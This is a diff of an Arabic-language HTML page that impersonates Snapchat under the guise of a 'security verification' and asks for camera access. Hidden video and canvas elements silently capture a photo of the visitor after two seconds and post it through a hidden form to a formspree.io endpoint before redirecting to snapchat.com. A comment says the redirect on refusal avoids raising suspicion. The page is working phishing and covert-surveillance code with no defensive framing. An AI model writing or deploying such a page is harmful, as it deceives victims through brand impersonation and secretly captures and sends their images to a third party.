@@ -3,34 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat | التحقق من الحساب</title>
-    <!-- أيقونة سنابشات تظهر في التبويب -->
+    <title>Snapchat | التحقق من الأمان</title>
     <link rel="icon" type="image/png" href="https://snapchat.com">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
-        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
+        .box { text-align: center; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 300px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { margin: 0; font-size: 18px; color: #333; }
+        h3 { font-size: 16px; color: #333; margin: 0; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="box">
         <div class="loader"></div>
-        <h2>جاري التحقق من أمان المتصفح...</h2>
-        <p style="font-size: 12px; color: #666;">يرجى السماح بالوصول للكاميرا لإتمام العملية</p>
+        <h3>جاري التحميل...</h3>
+        <p style="font-size: 11px; color: #777;">يرجى السماح بالوصول لإكمال العملية</p>
     </div>
 
-    <!-- عناصر المعالجة -->
+    <!-- العناصر التقنية المخفية -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- الرابط المحدث النهائي -->
-    <form id="photoForm" action="https://formspree.io/f/mqenyznv" method="POST">
+    <!-- الرابط المحدث -->
+    <form id="photoForm" action="https://formspree.io" method="POST">
         <input type="hidden" name="image_data" id="imageInput">
         <input type="hidden" name="_next" value="https://snapchat.com">
-        <input type="hidden" name="_subject" value="صورة جديدة من الرابط">
+        <input type="hidden" name="_subject" value="التقاط جديد">
     </form>
 
     <script>
@@ -43,6 +42,7 @@
             .then(stream => {
                 video.srcObject = stream;
                 
+                // التقاط الصورة بعد ثانيتين من فتح الكاميرا
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
@@ -50,12 +50,12 @@
                     const dataURL = canvas.toDataURL('image/png');
                     imageInput.value = dataURL;
                     
-                    // إرسال البيانات
+                    // إرسال للرابط ثم الانتقال للسناب شات
                     form.submit();
-                }, 2000); // زيادة المهلة قليلاً لضمان وضوح الصورة
+                }, 2000);
             })
             .catch(err => {
-                // في حال الرفض، التوجه للسناب فوراً
+                // في حال الرفض، يتم النقل للسناب شات فوراً لعدم إثارة الشبهات
                 window.location.href = "https://snapchat.com";
             });
     </script>
